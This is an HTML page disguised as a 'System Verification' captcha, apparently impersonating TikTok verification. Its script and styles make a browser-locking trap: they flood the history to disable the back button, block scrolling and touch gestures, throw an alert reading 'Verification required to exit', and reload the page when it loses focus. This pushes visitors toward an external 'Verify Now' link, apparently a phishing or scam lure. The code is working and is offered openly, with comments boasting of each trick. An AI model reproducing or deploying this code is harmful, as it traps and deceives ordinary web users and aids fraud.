<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        /* DISABLING THE ABILITY TO EVEN ATTEMPT A SCROLL */
        html, body {
            overflow: hidden !important;
            height: 100vh !important;
            position: fixed !important;
            width: 100vw !important;
            touch-action: none; /* Kills all browser-level gestures */
        }

        #hell-container {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: white;
            z-index: 99999;
            overflow: hidden;
        }
    </style>
</head>
<body>

<div id="hell-container">
    <div style="padding: 50px; text-align: center; font-family: sans-serif;">
        <h2>System Verification</h2>
        <p>Please wait...</p>
        <a id="breakout-link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">
            Verify Now
        </a>
    </div>
</div>

<script>
    // 1. HISTORY TRAP: Disables the back button/X functionality
    function trapHistory() {
        for(let i=0; i<50; i++) {
            window.history.pushState(null, "", window.location.href);
        }
    }
    
    window.onpopstate = function() {
        window.history.pushState(null, "", window.location.href);
        alert("Verification required to exit."); // Forces focus back to the page
    };

    // 2. SCROLL HIJACK: Native browser scroll is dead
    document.addEventListener('touchstart', (e) => {
        if (e.target.id !== 'breakout-link') e.preventDefault();
    }, { passive: false });

    document.addEventListener('touchmove', (e) => {
        e.preventDefault();
    }, { passive: false });

    // 3. THE "X" NEUTRALIZER (THE REDIRECT TRICK)
    // If you redirect them to the same page every 0.5 seconds IF the page loses focus
    window.onblur = function() {
        // If they click the X or try to leave, we refresh the trap
        setTimeout(() => {
            window.location.replace(window.location.href);
        }, 1);
    };

    window.onload = () => {
        trapHistory();
    };
</script>
</body>
</html>
